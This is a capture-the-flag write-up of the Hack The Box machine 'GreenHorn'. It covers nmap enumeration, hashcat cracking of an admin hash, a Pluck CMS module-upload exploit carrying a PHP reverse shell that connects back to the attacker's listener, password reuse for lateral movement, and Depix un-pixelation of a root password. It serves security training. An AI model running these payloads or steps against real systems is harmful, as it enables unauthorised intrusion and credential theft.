---
title: "GreenHorn Writeup"
date: 2024-07-30T21:50:45-07:00
tags: ["Hack The Box", "Writeup"]
toc: true
draft: true

---

## Introduction

[GreenHorn is a Hack the Box](https://app.hackthebox.com/machines/GreenHorn) virtual machine that was released on July 20, 2024. It is an easy linux machine.

<!--more-->

## Enumeration

We will begin the penetration test with a `nmap` scan of the IP address:

```BashSession
┌─[eclectic@parrot]─[~]
└──╼ $sudo nmap -sC -sV 10.10.11.25
[sudo] password for eclectic: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-24 20:21 PDT
Nmap scan report for 10.10.11.25
Host is up (0.48s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://greenhorn.htb/
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=dfbed47744dbb66a; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=C6Na4eObGyn78LXLNlruBV6CuOQ6MTcyMTg3NzcyNjI2ODE5MTQ1MA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 25 Jul 2024 03:22:06 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>GreenHorn</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=211ccf76a5e2b1a1; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=yND_ak5BWyfN4-TzTIfqNye5GWo6MTcyMTg3NzczNDk1NjY5MTgzOQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 25 Jul 2024 03:22:14 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=7/24%Time=66A1C4DB%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,252E,"HTTP/1\.0\x20200\x20OK\r\nCache-Contr
SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
SF:ea=dfbed47744dbb66a;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
SF:kie:\x20_csrf=C6Na4eObGyn78LXLNlruBV6CuOQ6MTcyMTg3NzcyNjI2ODE5MTQ1MA;\x
SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
SF:ions:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2025\x20Jul\x202024\x2003:22:06\x
SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"the
SF:me-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\">\n\t<title>GreenHorn</title>\n\t<link\x
SF:20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoiR
SF:3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6
SF:Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmh
SF:vcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLC
SF:JzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvY
SF:X")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Method\x20Not\x20All
SF:owed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control:\x20max-age=0,
SF:\x20private,\x20must-revalidate,\x20no-transform\r\nSet-Cookie:\x20i_li
SF:ke_gitea=211ccf76a5e2b1a1;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nS
SF:et-Cookie:\x20_csrf=yND_ak5BWyfN4-TzTIfqNye5GWo6MTcyMTg3NzczNDk1NjY5MTg
SF:zOQ;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Fra
SF:me-Options:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2025\x20Jul\x202024\x2003:2
SF:2:14\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.47 seconds
```

There is a `ssh` and `http` service running on the server. Lets take a look at the website, but first we need to add the IP and URL to `/etc/hosts`:

```bashsession
┌─[eclectic@parrot]─[~]
└──╼ $ echo "10.10.11.25 greenhorn.htb" | sudo tee -a /etc/hosts
10.10.11.25 greenhorn.htb

```

The website is now viewable. It appears to be a website for the "GreenHorn Web Development" group. There aren't any forms in any of the visible pages, but there are two things of note:

- the website is powered by `pluck`
- there is an admin page at `/login.php`

Doing some research reveals `pluck` to be a content management system:

> *Pluck is a small and simple content management system (CMS), written in PHP. With Pluck, you can easily manage your own website. Pluck focuses on simplicity and ease of use. This makes Pluck an excellent choice for every small website. Licensed under the General Public License (GPL), Pluck is completely open source. This allows you to do with the software whatever you want, as long as the software stays open source.*
>
> -- From the [pluck Github repository](https://github.com/pluck-cms/pluck)

On the Frequently Asked Questions page, we find an entry on resetting the password:

> **Changing the Password** There is way to reset a lost password. But you can modify it via ftp!
>
> To do so, edit the value for ww in data\\settings\\pass.php
>
> ```php
> <?php
> $ww = 'ba3253876aed6bc22d4a6ff53d8406c6ad864195ed144ab5c87621b6c233b548baeae6956df346ec8c17f5ea10f35ee3cbc514797ed7ddd3145464e2a0bab413';
> ```
>
> This lines change the password to "123456".
>
> Then login, click 'options' and change the password

Trying this password in the admin page does not work. If we gain entry into the server, we can try resetting the password this way.

Now I just realized there is a third service running on port `3000`. Going to `10.10.11.25:3000` reveals a [gitea](https://about.gitea.com/) service running. It looks like we can sign up, so I create an account successfully. I can find the `greenhorn` repository on the gitea server. I could try to push a change to the password using the information above to log in, but we can try to crack the hash first:

```bashsession
┌─[eclectic@parrot]─[~]
└──╼ $echo 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163' > hash2
┌─[eclectic@parrot]─[~]
└──╼ $mv hash2 Downloads/
┌─[eclectic@parrot]─[~]
└──╼ $cd Downloads/
┌─[eclectic@parrot]─[~/Downloads]
└──╼ $hashid 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163'
Analyzing 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163'
[+] SHA-512 
[+] Whirlpool 
[+] Salsa10 
[+] Salsa20 
[+] SHA3-512 
[+] Skein-512 
[+] Skein-1024(512) 
┌─[eclectic@parrot]─[~/Downloads]
└──╼ $hashcat hash2 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 9 5900X 12-Core Processor, 2906/5877 MB (1024 MB allocatable), 6MCU

The following 7 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   1700 | SHA2-512                                                   | Raw Hash
  17600 | SHA3-512                                                   | Raw Hash
  11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian           | Raw Hash
  18000 | Keccak-512                                                 | Raw Hash
   6100 | Whirlpool                                                  | Raw Hash
   1770 | sha512(utf16le($pass))                                     | Raw Hash
  21000 | BitShares v0.x - sha512(sha512_bin(pass))                  | Cryptocurrency Wallet

Please specify the hash-mode with -m [hash-mode].

Started: Wed Jul 24 20:43:18 2024
Stopped: Wed Jul 24 20:43:19 2024
┌─[✗]─[eclectic@parrot]─[~/Downloads]
└──╼ $hashcat hash2 -m 1700 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 9 5900X 12-Core Processor, 2906/5877 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash
* Uses-64-Bit

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163:iloveyou1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1700 (SHA2-512)
Hash.Target......: d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe...790163
Time.Started.....: Wed Jul 24 20:43:42 2024 (0 secs)
Time.Estimated...: Wed Jul 24 20:43:42 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   283.7 kH/s (0.39ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3072/14344385 (0.02%)
Rejected.........: 0/3072 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> dangerous
Hardware.Mon.#1..: Util: 15%

Started: Wed Jul 24 20:43:29 2024
Stopped: Wed Jul 24 20:43:44
```

Trying the password `iloveyou1` on the admin page is successful, and we are greeted with the admin dashboard. Also, if we had to push a new password hash to the repo, we don't know if the repo will automatically build and compile on update.

## Foothold

Since we have a password, we could try to log in via `ssh`. Checking the repo shows one commit by `junior`,  but our ssh connection is denied due to a public key:

```bashsession
┌─[eclectic@parrot]─[~/Downloads]
└──╼ $ssh junior@10.10.11.25
The authenticity of host '10.10.11.25 (10.10.11.25)' can't be established.
ED25519 key fingerprint is SHA256:FrgpM50adTncJAsWACDugfF7duPzn9d6RzjZZFHNtLo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.25' (ED25519) to the list of known hosts.
junior@10.10.11.25: Permission denied (publickey).
```

We likely wont be able to get the public key, so we cannot ssh as of now.

Navigating the website, we come across a file upload. Looks like we will have to run a reverse shell to get in. Searching online for `pluck cms 4.7.18 exploits` shows us a ["File Upload Remote Code Execution"](https://www.exploit-db.com/exploits/49909). We can use this to upload a reverse shell.

In order for this to work, we need to create a reverse shell, zip it, and upload it as a module. Then we can access it at `http://greenhorn.htb/data/modules/[ZIP_NAME]/[REVERSE_SHELL].php`

```php
<?php $sock=fsockopen("10.10.16.3",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
```

Now we zip the file and upload it.

Start a netcat listener:

```bashsession
┌─[eclectic@parrot]─[~/Downloads]
└──╼ $nc -lvnp 1234
listening on [any] 1234 ...

```

And now visit the reverse shell location at `http://greenhorn.htb/data/modules/payload/rs.php` and:

```bashsession
┌─[eclectic@parrot]─[~/Downloads]
└──╼ $nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.25] 47106
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ 
```

We are in.

## Lateral Movement

Checking `/etc/passwd` shows us that `junior` is a user in the system:

```bashsession
junior:x:1000:1000::/home/junior:/bin/bash
```

Lets try logging in as `junior`:

```bashsession
www-data@greenhorn:/var/mail$ su - junior
su - junior
Password: iloveyou1

junior@greenhorn:~$ cat user.txt
cat user.txt
[USER FLAG]
junior@greenhorn:~$ 

```

Bingo.

## Privilege Escalation

It looks like we cannot run `sudo` commands as `junior`:

```bashsession
junior@greenhorn:~$ sudo -l
sudo -l
[sudo] password for junior: iloveyou1

Sorry, user junior may not run sudo on greenhorn.
junior@greenhorn:~$ id
id
uid=1000(junior) gid=1000(junior) groups=1000(junior)
junior@greenhorn:~$ 
```

It looks like there is a PDF in `junior`'s home directory:

```bashsession
junior@greenhorn:~$ ls
ls
 user.txt  'Using OpenVAS.pdf'
junior@greenhorn:~$ 
```

Start a web server in the home directory and download the pdf via `http://10.10.11.25:8000/Using%20OpenVAS.pdf`:

```bashsession
junior@greenhorn:~$ python3 -m http.server               
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.16.3 - - [25/Jul/2024 05:00:00] "GET / HTTP/1.1" 200 -
10.10.16.3 - - [25/Jul/2024 05:00:01] code 404, message File not found
10.10.16.3 - - [25/Jul/2024 05:00:01] "GET /favicon.ico HTTP/1.1" 404 -
10.10.16.3 - - [25/Jul/2024 05:00:02] "GET /Using%20OpenVAS.pdf HTTP/1.1" 200 -

```

The file shows the following (pasted into a code block by me):

```bashsession
Hello junior,


We have recently installed OpenVAS on our server to actively monitor and identify potential security vulnerabilities. Currently, only the root user, represented by myself, has the authorization to execute
OpenVAS using the following command:


`sudo /usr/sbin/openvas`

Enter password: [CENSORED TEXT]


As part of your familiarization with this tool, we encourage you to learn how to use OpenVAS effectively. In the future, you will also have the capability to run OpenVAS by entering the same command and providing your password when prompted. 


Feel free to reach out if you have any questions or need further assistance.


Have a great week,
Mr. Green
```

Oddly, this file does not exist. We cannot create this file ourselves to exploit because we do not have permissions.

```bashsession
┌─[eclectic@parrot]─[~/Downloads/Depix]
└──╼ $python3 depix.py -p output-000.ppm -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o unpix.png
2024-07-26 00:08:21,427 - Loading pixelated image from output-000.ppm
2024-07-26 00:08:21,441 - Loading search image from images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
2024-07-26 00:08:21,891 - Finding color rectangles from pixelated space
2024-07-26 00:08:21,892 - Found 252 same color rectangles
2024-07-26 00:08:21,892 - 190 rectangles left after moot filter
2024-07-26 00:08:21,892 - Found 1 different rectangle sizes
2024-07-26 00:08:21,893 - Finding matches in search image
2024-07-26 00:08:21,893 - Scanning 190 blocks with size (5, 5)
2024-07-26 00:08:21,913 - Scanning in searchImage: 0/1674
2024-07-26 00:08:55,012 - Removing blocks with no matches
2024-07-26 00:08:55,013 - Splitting single matches and multiple matches
2024-07-26 00:08:55,016 - [16 straight matches | 174 multiple matches]
2024-07-26 00:08:55,016 - Trying geometrical matches on single-match squares
2024-07-26 00:08:55,261 - [29 straight matches | 161 multiple matches]
2024-07-26 00:08:55,261 - Trying another pass on geometrical matches
2024-07-26 00:08:55,476 - [41 straight matches | 149 multiple matches]
2024-07-26 00:08:55,476 - Writing single match results to output
2024-07-26 00:08:55,477 - Writing average results for multiple matches to output
2024-07-26 00:08:58,106 - Saving output image to: unpix.png
┌─[eclectic@parrot]─[~/Downloads/Depix]
└──╼ $


```

The unpixelated image reveals the password to be: `sidefromsidetheothersidesidefromsidetheotherside`

```bashsession
┌─[✗]─[eclectic@parrot]─[~/Downloads/Depix]
└──╼ $ssh root@10.10.11.25
root@10.10.11.25's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Jul 26 07:14:01 AM UTC 2024

  System load:           0.01
  Usage of /:            57.0% of 3.45GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             257
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.25
  IPv6 address for eth0: dead:beef::250:56ff:feb0:77ef


This system is built by the Bento project by Chef Software
More information can be found at https://github.com/chef/bento
Last login: Thu Jul 18 12:55:08 2024 from 10.10.14.41
root@greenhorn:~# cd /root
root@greenhorn:~# ls
cleanup.sh  restart.sh  root.txt
root@greenhorn:~# cat root.txt
[ROOT FLAG]
root@greenhorn:~# 

```

